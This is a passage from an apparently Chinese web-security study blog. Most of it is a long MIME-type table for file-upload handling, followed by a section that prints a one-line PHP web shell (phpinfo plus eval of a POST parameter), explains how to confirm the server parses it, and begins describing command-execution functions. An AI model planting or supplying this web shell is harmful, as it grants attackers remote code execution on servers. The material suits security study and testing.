图片类型，将会以图片类型解析&quot;.*&quot;&#x3D;&quot;application&#x2F;octet-stream&quot;&quot;.001&quot;&#x3D;&quot;application&#x2F;x-001&quot;&quot;.301&quot;&#x3D;&quot;application&#x2F;x-301&quot;&quot;.323&quot;&#x3D;&quot;text&#x2F;h323&quot;&quot;.906&quot;&#x3D;&quot;application&#x2F;x-906&quot;&quot;.907&quot;&#x3D;&quot;drawing&#x2F;907&quot;&quot;.a11&quot;&#x3D;&quot;application&#x2F;x-a11&quot;&quot;.acp&quot;&#x3D;&quot;audio&#x2F;x-mei-aac&quot;&quot;.ai&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.aif&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.aifc&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.aiff&quot;&#x3D;&quot;audio&#x2F;aiff&quot;&quot;.anv&quot;&#x3D;&quot;application&#x2F;x-anv&quot;&quot;.asa&quot;&#x3D;&quot;text&#x2F;asa&quot;&quot;.asf&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;&quot;.asp&quot;&#x3D;&quot;text&#x2F;asp&quot;&quot;.asx&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;&quot;.au&quot;&#x3D;&quot;audio&#x2F;basic&quot;&quot;.avi&quot;&#x3D;&quot;video&#x2F;avi&quot;&quot;.awf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.workflow&quot;&quot;.biz&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.bmp&quot;&#x3D;&quot;application&#x2F;x-bmp&quot;&quot;.bot&quot;&#x3D;&quot;application&#x2F;x-bot&quot;&quot;.c4t&quot;&#x3D;&quot;application&#x2F;x-c4t&quot;&quot;.c90&quot;&#x3D;&quot;application&#x2F;x-c90&quot;&quot;.cal&quot;&#x3D;&quot;application&#x2F;x-cals&quot;&quot;.cat&quot;&#x3D;&quot;application&#x2F;s-pki.seccat&quot;&quot;.cdf&quot;&#x3D;&quot;application&#x2F;x-netcdf&quot;&quot;.cdr&quot;&#x3D;&quot;application&#x2F;x-cdr&quot;&quot;.cel&quot;&#x3D;&quot;application&#x2F;x-cel&quot;&quot;.cer&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.cg4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.cgm&quot;&#x3D;&quot;application&#x2F;x-cgm&quot;&quot;.cit&quot;&#x3D;&quot;application&#x2F;x-cit&quot;&quot;.class&quot;&#x3D;&quot;java&#x2F;*&quot;&quot;.cml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.cmp&quot;&#x3D;&quot;application&#x2F;x-cmp&quot;&quot;.cmx&quot;&#x3D;&quot;application&#x2F;x-cmx&quot;&quot;.cot&quot;&#x3D;&quot;application&#x2F;x-cot&quot;&quot;.crl&quot;&#x3D;&quot;application&#x2F;pkix-crl&quot;&quot;.crt&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.csi&quot;&#x3D;&quot;application&#x2F;x-csi&quot;&quot;.css&quot;&#x3D;&quot;text&#x2F;css&quot;&quot;.cut&quot;&#x3D;&quot;application&#x2F;x-cut&quot;&quot;.dbf&quot;&#x3D;&quot;application&#x2F;x-dbf&quot;&quot;.dbm&quot;&#x3D;&quot;application&#x2F;x-dbm&quot;&quot;.dbx&quot;&#x3D;&quot;application&#x2F;x-dbx&quot;&quot;.dcd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.dcx&quot;&#x3D;&quot;application&#x2F;x-dcx&quot;&quot;.der&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;&quot;.dgn&quot;&#x3D;&quot;application&#x2F;x-dgn&quot;&quot;.dib&quot;&#x3D;&quot;application&#x2F;x-dib&quot;&quot;.dll&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;&quot;.doc&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.dot&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.drw&quot;&#x3D;&quot;application&#x2F;x-drw&quot;&quot;.dtd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.dwf&quot;&#x3D;&quot;Model&#x2F;vnd.dwf&quot;&quot;.dwf&quot;&#x3D;&quot;application&#x2F;x-dwf&quot;&quot;.dwg&quot;&#x3D;&quot;application&#x2F;x-dwg&quot;&quot;.dxb&quot;&#x3D;&quot;application&#x2F;x-dxb&quot;&quot;.dxf&quot;&#x3D;&quot;application&#x2F;x-dxf&quot;&quot;.edn&quot;&#x3D;&quot;application&#x2F;vnd.adobe.edn&quot;&quot;.emf&quot;&#x3D;&quot;application&#x2F;x-emf&quot;&quot;.eml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.ent&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.epi&quot;&#x3D;&quot;application&#x2F;x-epi&quot;&quot;.eps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;&quot;.eps&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.etd&quot;&#x3D;&quot;application&#x2F;x-ebx&quot;&quot;.exe&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;&quot;.fax&quot;&#x3D;&quot;image&#x2F;fax&quot;&quot;.fdf&quot;&#x3D;&quot;application&#x2F;vnd.fdf&quot;&quot;.fif&quot;&#x3D;&quot;application&#x2F;fractals&quot;&quot;.fo&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.frm&quot;&#x3D;&quot;application&#x2F;x-frm&quot;&quot;.g4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.gbr&quot;&#x3D;&quot;application&#x2F;x-gbr&quot;&quot;.gcd&quot;&#x3D;&quot;application&#x2F;x-gcd&quot;&quot;.gif&quot;&#x3D;&quot;image&#x2F;gif&quot;&quot;.gl2&quot;&#x3D;&quot;application&#x2F;x-gl2&quot;&quot;.gp4&quot;&#x3D;&quot;application&#x2F;x-gp4&quot;&quot;.hgl&quot;&#x3D;&quot;application&#x2F;x-hgl&quot;&quot;.hmr&quot;&#x3D;&quot;application&#x2F;x-hmr&quot;&quot;.hpg&quot;&#x3D;&quot;application&#x2F;x-hpgl&quot;&quot;.hpl&quot;&#x3D;&quot;application&#x2F;x-hpl&quot;&quot;.hqx&quot;&#x3D;&quot;application&#x2F;mac-binhex40&quot;&quot;.hrf&quot;&#x3D;&quot;application&#x2F;x-hrf&quot;&quot;.hta&quot;&#x3D;&quot;application&#x2F;hta&quot;&quot;.htc&quot;&#x3D;&quot;text&#x2F;x-component&quot;&quot;.htm&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.html&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.htt&quot;&#x3D;&quot;text&#x2F;webviewhtml&quot;&quot;.htx&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.icb&quot;&#x3D;&quot;application&#x2F;x-icb&quot;&quot;.ico&quot;&#x3D;&quot;image&#x2F;x-icon&quot;&quot;.ico&quot;&#x3D;&quot;application&#x2F;x-ico&quot;&quot;.iff&quot;&#x3D;&quot;application&#x2F;x-iff&quot;&quot;.ig4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;&quot;.igs&quot;&#x3D;&quot;application&#x2F;x-igs&quot;&quot;.iii&quot;&#x3D;&quot;application&#x2F;x-iphone&quot;&quot;.img&quot;&#x3D;&quot;application&#x2F;x-img&quot;&quot;.ins&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;&quot;.isp&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;&quot;.IVF&quot;&#x3D;&quot;video&#x2F;x-ivf&quot;&quot;.java&quot;&#x3D;&quot;java&#x2F;*&quot;&quot;.jfif&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpe&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpe&quot;&#x3D;&quot;application&#x2F;x-jpe&quot;&quot;.jpeg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;&quot;.jpg&quot;&#x3D;&quot;application&#x2F;x-jpg&quot;&quot;.js&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.jsp&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.la1&quot;&#x3D;&quot;audio&#x2F;x-liquid-file&quot;&quot;.lar&quot;&#x3D;&quot;application&#x2F;x-laplayer-reg&quot;&quot;.latex&quot;&#x3D;&quot;application&#x2F;x-latex&quot;&quot;.lavs&quot;&#x3D;&quot;audio&#x2F;x-liquid-secure&quot;&quot;.lbm&quot;&#x3D;&quot;application&#x2F;x-lbm&quot;&quot;.lmsff&quot;&#x3D;&quot;audio&#x2F;x-la-lms&quot;&quot;.ls&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.ltr&quot;&#x3D;&quot;application&#x2F;x-ltr&quot;&quot;.m1v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.m2v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.m3u&quot;&#x3D;&quot;audio&#x2F;mpegurl&quot;&quot;.m4e&quot;&#x3D;&quot;video&#x2F;mpeg4&quot;&quot;.mac&quot;&#x3D;&quot;application&#x2F;x-mac&quot;&quot;.man&quot;&#x3D;&quot;application&#x2F;x-troff-man&quot;&quot;.math&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mdb&quot;&#x3D;&quot;application&#x2F;msaccess&quot;&quot;.mdb&quot;&#x3D;&quot;application&#x2F;x-mdb&quot;&quot;.mfp&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;&quot;.mht&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.mhtml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.mi&quot;&#x3D;&quot;application&#x2F;x-mi&quot;&quot;.mid&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.midi&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.mil&quot;&#x3D;&quot;application&#x2F;x-mil&quot;&quot;.mml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mnd&quot;&#x3D;&quot;audio&#x2F;x-musicnet-download&quot;&quot;.mns&quot;&#x3D;&quot;audio&#x2F;x-musicnet-stream&quot;&quot;.mocha&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;&quot;.movie&quot;&#x3D;&quot;video&#x2F;x-sgi-movie&quot;&quot;.mp1&quot;&#x3D;&quot;audio&#x2F;mp1&quot;&quot;.mp2&quot;&#x3D;&quot;audio&#x2F;mp2&quot;&quot;.mp2v&quot;&#x3D;&quot;video&#x2F;mpeg&quot;&quot;.mp3&quot;&#x3D;&quot;audio&#x2F;mp3&quot;&quot;.mp4&quot;&#x3D;&quot;video&#x2F;mp4&quot;&quot;.mpa&quot;&#x3D;&quot;video&#x2F;x-mpg&quot;&quot;.mpd&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mpe&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.mpeg&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpg&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpga&quot;&#x3D;&quot;audio&#x2F;rn-mpeg&quot;&quot;.mpp&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mps&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;&quot;.mpt&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mpv&quot;&#x3D;&quot;video&#x2F;mpg&quot;&quot;.mpv2&quot;&#x3D;&quot;video&#x2F;mpeg&quot;&quot;.mpw&quot;&#x3D;&quot;application&#x2F;s-project&quot;&quot;.mpx&quot;&#x3D;&quot;application&#x2F;-project&quot;&quot;.mtx&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.mxp&quot;&#x3D;&quot;application&#x2F;x-mmxp&quot;&quot;.net&quot;&#x3D;&quot;image&#x2F;pnetvue&quot;&quot;.nrf&quot;&#x3D;&quot;application&#x2F;x-nrf&quot;&quot;.nws&quot;&#x3D;&quot;message&#x2F;rfc822&quot;&quot;.odc&quot;&#x3D;&quot;text&#x2F;x-ms-odc&quot;&quot;.out&quot;&#x3D;&quot;application&#x2F;x-out&quot;&quot;.p10&quot;&#x3D;&quot;application&#x2F;pkcs10&quot;&quot;.p12&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;&quot;.p7b&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;&quot;.p7c&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;&quot;.p7m&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;&quot;.p7r&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certreqresp&quot;&quot;.p7s&quot;&#x3D;&quot;application&#x2F;pkcs7-signature&quot;&quot;.pc5&quot;&#x3D;&quot;application&#x2F;x-pc5&quot;&quot;.pci&quot;&#x3D;&quot;application&#x2F;x-pci&quot;&quot;.pcl&quot;&#x3D;&quot;application&#x2F;x-pcl&quot;&quot;.pcx&quot;&#x3D;&quot;application&#x2F;x-pcx&quot;&quot;.pdf&quot;&#x3D;&quot;application&#x2F;pdf&quot;&quot;.pdx&quot;&#x3D;&quot;application&#x2F;vnd.adobe.pdx&quot;&quot;.pfx&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;&quot;.pgl&quot;&#x3D;&quot;application&#x2F;x-pgl&quot;&quot;.pic&quot;&#x3D;&quot;application&#x2F;x-pic&quot;&quot;.pko&quot;&#x3D;&quot;application-pki.pko&quot;&quot;.pl&quot;&#x3D;&quot;application&#x2F;x-perl&quot;&quot;.plg&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.pls&quot;&#x3D;&quot;audio&#x2F;scpls&quot;&quot;.plt&quot;&#x3D;&quot;application&#x2F;x-plt&quot;&quot;.png&quot;&#x3D;&quot;image&#x2F;png&quot;&quot;.png&quot;&#x3D;&quot;application&#x2F;x-png&quot;&quot;.pot&quot;&#x3D;&quot;applications-powerpoint&quot;&quot;.ppa&quot;&#x3D;&quot;application&#x2F;vs-powerpoint&quot;&quot;.ppm&quot;&#x3D;&quot;application&#x2F;x-ppm&quot;&quot;.pps&quot;&#x3D;&quot;application-powerpoint&quot;&quot;.ppt&quot;&#x3D;&quot;applications-powerpoint&quot;&quot;.ppt&quot;&#x3D;&quot;application&#x2F;x-ppt&quot;&quot;.pr&quot;&#x3D;&quot;application&#x2F;x-pr&quot;&quot;.prf&quot;&#x3D;&quot;application&#x2F;pics-rules&quot;&quot;.prn&quot;&#x3D;&quot;application&#x2F;x-prn&quot;&quot;.prt&quot;&#x3D;&quot;application&#x2F;x-prt&quot;&quot;.ps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;&quot;.ps&quot;&#x3D;&quot;application&#x2F;postscript&quot;&quot;.ptn&quot;&#x3D;&quot;application&#x2F;x-ptn&quot;&quot;.pwz&quot;&#x3D;&quot;application&#x2F;powerpoint&quot;&quot;.r3t&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext3d&quot;&quot;.ra&quot;&#x3D;&quot;audio&#x2F;vnd.rn-realaudio&quot;&quot;.ram&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;&quot;.ras&quot;&#x3D;&quot;application&#x2F;x-ras&quot;&quot;.rat&quot;&#x3D;&quot;application&#x2F;rat-file&quot;&quot;.rdf&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.rec&quot;&#x3D;&quot;application&#x2F;vnd.rn-recording&quot;&quot;.red&quot;&#x3D;&quot;application&#x2F;x-red&quot;&quot;.rgb&quot;&#x3D;&quot;application&#x2F;x-rgb&quot;&quot;.rjs&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjs&quot;&quot;.rjt&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjt&quot;&quot;.rlc&quot;&#x3D;&quot;application&#x2F;x-rlc&quot;&quot;.rle&quot;&#x3D;&quot;application&#x2F;x-rle&quot;&quot;.rm&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia&quot;&quot;.rmf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.rmf&quot;&quot;.rmi&quot;&#x3D;&quot;audio&#x2F;mid&quot;&quot;.rmj&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmj&quot;&quot;.rmm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;&quot;.rmp&quot;&#x3D;&quot;application&#x2F;vnd.rn-rn_music_package&quot;&quot;.rms&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-secure&quot;&quot;.rmvb&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-vbr&quot;&quot;.rmx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmx&quot;&quot;.rnx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realplayer&quot;&quot;.rp&quot;&#x3D;&quot;image&#x2F;vnd.rn-realpix&quot;&quot;.rpm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio-plugin&quot;&quot;.rsml&quot;&#x3D;&quot;application&#x2F;vnd.rn-rsml&quot;&quot;.rt&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext&quot;&quot;.rtf&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.rtf&quot;&#x3D;&quot;application&#x2F;x-rtf&quot;&quot;.rv&quot;&#x3D;&quot;video&#x2F;vnd.rn-realvideo&quot;&quot;.sam&quot;&#x3D;&quot;application&#x2F;x-sam&quot;&quot;.sat&quot;&#x3D;&quot;application&#x2F;x-sat&quot;&quot;.sdp&quot;&#x3D;&quot;application&#x2F;sdp&quot;&quot;.sdw&quot;&#x3D;&quot;application&#x2F;x-sdw&quot;&quot;.sit&quot;&#x3D;&quot;application&#x2F;x-stuffit&quot;&quot;.slb&quot;&#x3D;&quot;application&#x2F;x-slb&quot;&quot;.sld&quot;&#x3D;&quot;application&#x2F;x-sld&quot;&quot;.slk&quot;&#x3D;&quot;drawing&#x2F;x-slk&quot;&quot;.smi&quot;&#x3D;&quot;application&#x2F;smil&quot;&quot;.smil&quot;&#x3D;&quot;application&#x2F;smil&quot;&quot;.smk&quot;&#x3D;&quot;application&#x2F;x-smk&quot;&quot;.snd&quot;&#x3D;&quot;audio&#x2F;basic&quot;&quot;.sol&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.sor&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.spc&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;&quot;.spl&quot;&#x3D;&quot;application&#x2F;futuresplash&quot;&quot;.spp&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.ssm&quot;&#x3D;&quot;application&#x2F;streamingmedia&quot;&quot;.sst&quot;&#x3D;&quot;application-pki.certstore&quot;&quot;.stl&quot;&#x3D;&quot;application&#x2F;-pki.stl&quot;&quot;.stm&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.sty&quot;&#x3D;&quot;application&#x2F;x-sty&quot;&quot;.svg&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.swf&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;&quot;.tdf&quot;&#x3D;&quot;application&#x2F;x-tdf&quot;&quot;.tg4&quot;&#x3D;&quot;application&#x2F;x-tg4&quot;&quot;.tga&quot;&#x3D;&quot;application&#x2F;x-tga&quot;&quot;.tif&quot;&#x3D;&quot;image&#x2F;tiff&quot;&quot;.tif&quot;&#x3D;&quot;application&#x2F;x-tif&quot;&quot;.tiff&quot;&#x3D;&quot;image&#x2F;tiff&quot;&quot;.tld&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.top&quot;&#x3D;&quot;drawing&#x2F;x-top&quot;&quot;.torrent&quot;&#x3D;&quot;application&#x2F;x-bittorrent&quot;&quot;.tsd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.txt&quot;&#x3D;&quot;text&#x2F;plain&quot;&quot;.uin&quot;&#x3D;&quot;application&#x2F;x-icq&quot;&quot;.uls&quot;&#x3D;&quot;text&#x2F;iuls&quot;&quot;.vcf&quot;&#x3D;&quot;text&#x2F;x-vcard&quot;&quot;.vda&quot;&#x3D;&quot;application&#x2F;x-vda&quot;&quot;.vdx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.vpg&quot;&#x3D;&quot;application&#x2F;x-vpeg005&quot;&quot;.vsd&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vsd&quot;&#x3D;&quot;application&#x2F;x-vsd&quot;&quot;.vss&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vst&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vst&quot;&#x3D;&quot;application&#x2F;x-vst&quot;&quot;.vsw&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vsx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vtx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;&quot;.vxml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.wav&quot;&#x3D;&quot;audio&#x2F;wav&quot;&quot;.wax&quot;&#x3D;&quot;audio&#x2F;x-ms-wax&quot;&quot;.wb1&quot;&#x3D;&quot;application&#x2F;x-wb1&quot;&quot;.wb2&quot;&#x3D;&quot;application&#x2F;x-wb2&quot;&quot;.wb3&quot;&#x3D;&quot;application&#x2F;x-wb3&quot;&quot;.wbmp&quot;&#x3D;&quot;image&#x2F;vnd.wap.wbmp&quot;&quot;.wiz&quot;&#x3D;&quot;application&#x2F;msword&quot;&quot;.wk3&quot;&#x3D;&quot;application&#x2F;x-wk3&quot;&quot;.wk4&quot;&#x3D;&quot;application&#x2F;x-wk4&quot;&quot;.wkq&quot;&#x3D;&quot;application&#x2F;x-wkq&quot;&quot;.wks&quot;&#x3D;&quot;application&#x2F;x-wks&quot;&quot;.wm&quot;&#x3D;&quot;video&#x2F;x-ms-wm&quot;&quot;.wma&quot;&#x3D;&quot;audio&#x2F;x-ms-wma&quot;&quot;.wmd&quot;&#x3D;&quot;application&#x2F;x-ms-wmd&quot;&quot;.wmf&quot;&#x3D;&quot;application&#x2F;x-wmf&quot;&quot;.wml&quot;&#x3D;&quot;text&#x2F;vnd.wap.wml&quot;&quot;.wmv&quot;&#x3D;&quot;video&#x2F;x-ms-wmv&quot;&quot;.wmx&quot;&#x3D;&quot;video&#x2F;x-ms-wmx&quot;&quot;.wmz&quot;&#x3D;&quot;application&#x2F;x-ms-wmz&quot;&quot;.wp6&quot;&#x3D;&quot;application&#x2F;x-wp6&quot;&quot;.wpd&quot;&#x3D;&quot;application&#x2F;x-wpd&quot;&quot;.wpg&quot;&#x3D;&quot;application&#x2F;x-wpg&quot;&quot;.wpl&quot;&#x3D;&quot;application&#x2F;-wpl&quot;&quot;.wq1&quot;&#x3D;&quot;application&#x2F;x-wq1&quot;&quot;.wr1&quot;&#x3D;&quot;application&#x2F;x-wr1&quot;&quot;.wri&quot;&#x3D;&quot;application&#x2F;x-wri&quot;&quot;.wrk&quot;&#x3D;&quot;application&#x2F;x-wrk&quot;&quot;.ws&quot;&#x3D;&quot;application&#x2F;x-ws&quot;&quot;.ws2&quot;&#x3D;&quot;application&#x2F;x-ws&quot;&quot;.wsc&quot;&#x3D;&quot;text&#x2F;scriptlet&quot;&quot;.wsdl&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.wvx&quot;&#x3D;&quot;video&#x2F;x-ms-wvx&quot;&quot;.xdp&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xdp&quot;&quot;.xdr&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xfd&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfd&quot;&quot;.xfdf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfdf&quot;&quot;.xhtml&quot;&#x3D;&quot;text&#x2F;html&quot;&quot;.xls&quot;&#x3D;&quot;application&#x2F;-excel&quot;&quot;.xls&quot;&#x3D;&quot;application&#x2F;x-xls&quot;&quot;.xlw&quot;&#x3D;&quot;application&#x2F;x-xlw&quot;&quot;.xml&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xpl&quot;&#x3D;&quot;audio&#x2F;scpls&quot;&quot;.xq&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xql&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xquery&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xsd&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xsl&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xslt&quot;&#x3D;&quot;text&#x2F;xml&quot;&quot;.xwd&quot;&#x3D;&quot;application&#x2F;x-xwd&quot;&quot;.x_b&quot;&#x3D;&quot;application&#x2F;x-x_b&quot;&quot;.x_t&quot;&#x3D;&quot;application&#x2F;x-x_t&quot;Office2007对应的值:&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.template&quot; (for .docx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation&quot; (for .pptx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slideshow&quot; (for .ppsx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.template&quot; (for .potx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot; (for .xlsx files)&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.template&quot; (for .xltx files)相对于Office2003是这样的Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="最常用的马"><a href="#最常用的马" class="headerlink" title="最常用的马"></a>最常用的马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); @eval($_POST[&#39;shell&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>这样写的目的是有phpinfo()的回显，如果显示了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717003904.png">的回显，则为能够解析木马，否则不能解析<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3></li><li>system函数用于执行外部程序，并且<strong>显示输出</strong><pre class="line-numbers language-none"><code class="language-none">system(string $command,int &amp;$return_var&#x3D;?):string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>返回值为可选的，可以省略</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716122452.png"></li></ol><h3 id="eval"><a href="#eval" class="headerlink" 